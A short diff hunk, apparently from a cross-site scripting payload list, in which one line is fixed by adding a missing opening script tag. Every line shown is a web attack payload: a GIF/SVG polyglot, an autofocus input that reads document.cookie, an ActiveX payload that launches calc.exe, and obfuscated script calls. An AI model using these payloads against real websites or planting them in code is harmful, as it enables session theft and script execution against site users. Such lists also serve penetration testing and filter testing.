@@ -1726,4 +1726,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <!'/!"/!\'/\"/--!><Input/Type=Text AutoFocus */; OnFocus=(confirm)(document.cookie) //>
 <script>var r = new ActiveXObject("WScript.Shell").Run("calc.exe");</script>
 <script>this[Object["keys"](this)[146]](1)</script>
-this[Object["keys"](this)[5]](1)</script>
+<script>this[Object["keys"](this)[5]](1)</script>
